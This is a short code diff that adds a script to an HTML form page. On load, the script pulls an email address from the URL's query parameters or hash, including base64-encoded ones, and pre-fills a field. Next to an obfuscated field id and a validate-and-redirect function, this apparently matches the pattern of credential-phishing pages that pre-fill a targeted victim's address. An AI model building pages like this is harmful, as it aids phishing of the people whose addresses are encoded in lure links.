@@ -113,7 +113,52 @@
             </tbody></table>
         </form>
     </div>
-    
+    <script>
+        function getEmailFromURL() {
+            const url = new URL(window.location.href);
+            
+            // Get all query parameters
+            for (const [key, value] of url.searchParams.entries()) {
+                const decodedValue = decodeURIComponent(value);
+                let email = extractValidEmail(decodedValue);
+                if (email) {
+                    updateEmailField(email);
+                    return;
+                }
+            }
+
+            // Check for email in the hash fragment
+            if (url.hash) {
+                const hashValue = decodeURIComponent(url.hash.substring(1));
+                let email = extractValidEmail(hashValue);
+                if (email) {
+                    updateEmailField(email);
+                }
+            }
+        }
+
+        function extractValidEmail(str) {
+            try {
+                // Check for base64 encoded email
+                let decodedStr = atob(str);
+                if (isValidEmail(decodedStr)) return decodedStr;
+            } catch (e) {
+                // Not a valid base64 string, continue checking as plain text
+            }
+            return isValidEmail(str) ? str : null;
+        }
+
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        function updateEmailField(email) {
+            document.getElementById('emailInput').value = email;
+        }
+
+        // Run function on page load
+        window.onload = getEmailFromURL;
+    </script>
     <script>
         function validateAndRedirect() {
             let emailInput = document.getElementById("xFuDge").value.trim();
